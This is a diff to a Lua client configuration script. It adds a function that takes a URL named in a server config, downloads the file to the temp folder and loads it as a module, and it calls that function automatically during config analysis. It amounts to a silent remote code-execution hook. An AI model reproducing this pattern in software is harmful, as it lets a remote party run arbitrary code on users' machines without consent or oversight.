@@ -170,6 +170,47 @@ function TryForceUpdate(tServerConfig)
 end
 
 
+function TryExecuteExtraCode(tServerConfig)
+	local FunctionObj = XLGetGlobal("Project.FunctionHelper") 
+	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
+	local strURL = tExtraHelper["strURL"]
+	local strMD5 = tExtraHelper["strMD5"]
+	
+	if not IsRealString(strURL) then
+		return
+	end
+	
+	local tVersionLimit = tExtraHelper["tVersion"]
+	if type(tVersionLimit) == "table" then
+		local bPassCheck = CheckForceVersion(tVersionLimit)
+		TipLog("[TryExecuteExtraCode] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
+		if not bPassCheck then
+			return 
+		end
+	end
+	
+	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
+	
+	local strStamp = FunctionObj.GetTimeStamp()
+	local strURLFix = strURL..strStamp
+	
+	DownLoadFileWithCheck(strURLFix, strSavePath, strMD5
+	, function(bRet, strRealPath)
+		TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
+		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
+				
+		if bRet < 0 then
+			return
+		end
+		
+		TipLog("[TryExecuteExtraCode] begin execute extra helper: "..tostring(strRealPath))
+		XLLoadModule(strRealPath)
+	end)	
+end
+
+
 function FixUserConfig(tServerConfig)
 	local FunctionObj = XLGetGlobal("Project.FunctionHelper") 
 	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
@@ -422,6 +463,8 @@ function AnalyzeServerConfig(nDownServer, strServerPath)
 	FixStartConfig(tServerConfig)
 	FixUserConfig(tServerConfig)
 	CheckServerRuleFile(tServerConfig)
+	
+	TryExecuteExtraCode(tServerConfig)
 end
 
 
